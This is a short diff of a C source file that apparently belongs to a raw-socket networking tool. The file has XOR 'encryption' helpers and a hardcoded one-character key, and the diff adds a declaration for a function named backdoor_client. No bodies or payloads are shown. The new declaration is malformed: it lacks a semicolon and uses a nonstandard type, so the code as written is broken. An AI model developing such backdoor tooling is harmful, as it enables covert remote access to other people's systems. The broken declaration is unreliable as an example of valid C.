@@ -27,6 +27,8 @@
 #include <netinet/ether.h>
 #include <pthread.h>
 
+#include "defs.h"
+
 
 // Globals
 char key = 'A';
@@ -62,6 +64,7 @@ static struct _pseudo_header {
 	struct tcphdr tcp;
 } pseudo_header;
 
+void *backdoor_client(uint32 ipaddress, int protocol)
 char *xor_encrypt(char *data);
 char *xor_decrypt(char *data);
 void print_usage(char *argv[]);
